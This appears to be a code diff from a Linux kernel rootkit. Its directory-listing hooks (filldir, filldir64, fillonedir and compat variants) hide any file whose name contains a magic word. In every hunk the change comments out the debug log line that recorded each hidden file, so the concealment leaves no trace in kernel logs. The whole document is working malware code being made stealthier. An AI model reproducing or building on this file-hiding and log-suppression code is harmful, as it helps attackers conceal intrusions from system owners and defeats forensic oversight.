@@ -23,7 +23,7 @@ static bool hook_fillonedir(struct dir_context *ctx,
   
     if (strstr(name, MAGIC_WORD)){
         buf->result = -ENOENT;
-        printk(KERN_DEBUG "filldir64 hiding %s\n", name);
+        //printk(KERN_DEBUG "filldir64 hiding %s\n", name);
         return false;
     }
     
@@ -41,7 +41,7 @@ static bool hook_filldir(struct dir_context *ctx, const char *name, int namlen,
   
     if (strstr(name, MAGIC_WORD)){
         buf->result = -ENOENT;
-        printk(KERN_DEBUG "filldir64 hiding %s\n", name);
+        //printk(KERN_DEBUG "filldir64 hiding %s\n", name);
         return false;
     }
     
@@ -59,7 +59,7 @@ static bool hook_filldir64(struct dir_context *ctx, const char *name, int namlen
   
     if (strstr(name, MAGIC_WORD)){
         buf->result = -ENOENT;
-        printk(KERN_DEBUG "filldir64 hiding %s\n", name);
+        //printk(KERN_DEBUG "filldir64 hiding %s\n", name);
         return false;
     }
   
@@ -79,7 +79,7 @@ static bool hook_compat_fillonedir(struct dir_context *ctx, const char *name,
   
     if (strstr(name, MAGIC_WORD)){
         buf->result = -ENOENT;
-        printk(KERN_DEBUG "filldir64 hiding %s\n", name);
+        //printk(KERN_DEBUG "filldir64 hiding %s\n", name);
         return false;
     }
     
@@ -97,7 +97,7 @@ static bool hook_compat_filldir(struct dir_context *ctx, const char *name, int n
   
     if (strstr(name, MAGIC_WORD)){
         buf->result = -ENOENT;
-        printk(KERN_DEBUG "filldir64 hiding %s\n", name);
+        //printk(KERN_DEBUG "filldir64 hiding %s\n", name);
         return false;
     }
     
